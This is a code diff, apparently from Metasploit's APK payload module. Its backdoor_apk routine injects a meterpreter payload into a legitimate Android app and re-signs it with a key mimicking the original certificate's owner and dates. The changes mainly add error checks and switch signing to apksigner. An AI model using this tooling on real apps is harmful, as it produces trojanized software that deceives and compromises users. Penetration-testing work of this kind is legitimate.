@@ -125,10 +125,28 @@ class Msf::Payload::Apk
   def parse_orig_cert_data(orig_apkfile)
     orig_cert_data = Array[]
     keytool_output = run_cmd(['keytool', '-J-Duser.language=en', '-printcert', '-jarfile', orig_apkfile])
-    owner_line = keytool_output.match(/^Owner:.+/)[0]
+
+    if keytool_output.include?('keytool error: ')
+      raise RuntimeError, "keytool could not parse APK file: #{keytool_output}"
+    end
+
+    if keytool_output.start_with?('Not a signed jar file')
+      raise RuntimeError, 'APK file is unsigned'
+    end
+
+    owner_line = keytool_output.scan(/^Owner:.+/).flatten.first
+    if owner_line.blank?
+      raise RuntimeError, "Could not extract certificate owner: #{keytool_output}"
+    end
+
     orig_cert_dname = owner_line.gsub(/^.*:/, '').strip
     orig_cert_data.push("#{orig_cert_dname}")
-    valid_from_line = keytool_output.match(/^Valid from:.+/)[0]
+
+    valid_from_line = keytool_output.scan(/^Valid from:.+/).flatten.first
+    if valid_from_line.empty?
+      raise RuntimeError, "Could not extract certificate date: #{keytool_output}"
+    end
+
     from_date_str = valid_from_line.gsub(/^Valid from:/, '').gsub(/until:.+/, '').strip
     to_date_str = valid_from_line.gsub(/^Valid from:.+until:/, '').strip
     from_date = DateTime.parse("#{from_date_str}")
@@ -139,20 +157,41 @@ class Msf::Payload::Apk
     return orig_cert_data
   end
 
+  def check_apktool_output_for_exceptions(apktool_output)
+    if apktool_output.to_s.include?('Exception in thread')
+      print_error(apktool_output)
+      raise RuntimeError, "apktool execution failed"
+    end
+  end
+
   def backdoor_apk(apkfile, raw_payload, signature = true, manifest = true, apk_data = nil, service = true)
     unless apk_data || apkfile && File.readable?(apkfile)
       usage
       raise RuntimeError, "Invalid template: #{apkfile}"
     end
 
-    apktool = run_cmd(%w[apktool -version])
-    if apktool.nil?
+    check_apktool = run_cmd(%w[apktool -version])
+    if check_apktool.nil?
       raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
     end
 
-    apk_v = Rex::Version.new(apktool.split("\n").first.strip)
+    if check_apktool.to_s.include?('java: not found')
+      raise RuntimeError, "java not found. If it's not in your PATH, please add it."
+    end
+
+    jar_name = 'apktool.jar'
+    if check_apktool.to_s.include?("can't find #{jar_name}")
+      raise RuntimeError, "#{jar_name} not found. This file must exist in the same directory as apktool."
+    end
+
+    check_apktool_output_for_exceptions(check_apktool)
+
+    apk_v = Rex::Version.new(check_apktool.split("\n").first.strip)
     unless apk_v >= Rex::Version.new('2.0.1')
       raise RuntimeError, "apktool version #{apk_v} not supported, please download at least version 2.0.1."
+    end
+    unless apk_v >= Rex::Version.new('2.5.1')
+      print_warning("apktool version #{apk_v} is outdated and may fail to decompile some apk files. Update apktool to the latest version.")
     end
 
     #Create temporary directory where work will be done
@@ -170,9 +209,9 @@ class Msf::Payload::Apk
         raise RuntimeError, "keytool not found. If it's not in your PATH, please add it."
       end
 
-      jarsigner = run_cmd(['jarsigner'])
-      unless jarsigner != nil
-        raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
+      apksigner = run_cmd(['apksigner'])
+      if apksigner.nil?
+        raise RuntimeError, "apksigner not found. If it's not in your PATH, please add it."
       end
 
       zipalign = run_cmd(['zipalign'])
@@ -184,23 +223,31 @@ class Msf::Payload::Apk
       storepass = "android"
       keypass = "android"
       keyalias = "signing.key"
+
       orig_cert_data = parse_orig_cert_data(apkfile)
       orig_cert_dname = orig_cert_data[0]
       orig_cert_startdate = orig_cert_data[1]
       orig_cert_validity = orig_cert_data[2]
 
       print_status "Creating signing key and keystore..\n"
-      run_cmd([
+      keytool_output = run_cmd([
         'keytool', '-genkey', '-v', '-keystore', keystore, '-alias', keyalias, '-storepass', storepass,
         '-keypass', keypass, '-keyalg', 'RSA', '-keysize', '2048', '-startdate', orig_cert_startdate,
         '-validity', orig_cert_validity, '-dname', orig_cert_dname
       ])
+
+      if keytool_output.include?('keytool error: ')
+        raise RuntimeError, "keytool could not generate key: #{keytool_output}"
+      end
     end
 
     print_status "Decompiling original APK..\n"
-    run_cmd(['apktool', 'd', "#{tempdir}/original.apk", '-o', "#{tempdir}/original"])
+    apktool_output = run_cmd(['apktool', 'd', "#{tempdir}/original.apk", '-o', "#{tempdir}/original"])
+    check_apktool_output_for_exceptions(apktool_output)
+
     print_status "Decompiling payload APK..\n"
-    run_cmd(['apktool', 'd', "#{tempdir}/payload.apk", '-o', "#{tempdir}/payload"])
+    apktool_output = run_cmd(['apktool', 'd', "#{tempdir}/payload.apk", '-o', "#{tempdir}/payload"])
+    check_apktool_output_for_exceptions(apktool_output)
 
     amanifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
 
@@ -277,19 +324,36 @@ class Msf::Payload::Apk
 
     print_status "Rebuilding apk with meterpreter injection as #{injected_apk}\n"
     apktool_output = run_cmd(['apktool', 'b', '-o', injected_apk, "#{tempdir}/original"])
+    check_apktool_output_for_exceptions(apktool_output)
+
     unless File.readable?(injected_apk)
       print_error apktool_output
       raise RuntimeError, "Unable to rebuild apk with apktool"
     end
 
     if signature
-      print_status "Signing #{injected_apk}\n"
-      run_cmd([
-        'jarsigner', '-sigalg', 'SHA1withRSA', '-digestalg', 'SHA1', '-keystore', keystore,
-        '-storepass', storepass, '-keypass', keypass, injected_apk, keyalias
-      ])
       print_status "Aligning #{injected_apk}\n"
-      run_cmd(['zipalign', '4', injected_apk, aligned_apk])
+      zipalign_output = run_cmd(['zipalign', '4', injected_apk, aligned_apk])
+
+      unless File.readable?(aligned_apk)
+        print_error(zipalign_output)
+        raise RuntimeError, 'Unable to align apk with zipalign.'
+      end
+
+      print_status "Signing #{aligned_apk} with apksigner\n"
+      apksigner_output = run_cmd([
+        'apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", aligned_apk
+      ])
+      if apksigner_output.to_s.include?('Failed')
+        print_error(apksigner_output)
+        raise RuntimeError, 'Signing with apksigner failed.'
+      end
+
+      apksigner_verify = run_cmd(['apksigner', 'verify', '--verbose', aligned_apk])
+      if apksigner_verify.to_s.include?('DOES NOT VERIFY')
+        print_error(apksigner_verify)
+        raise RuntimeError, 'Signature verification failed.'
+      end
     else
       aligned_apk = injected_apk
     end
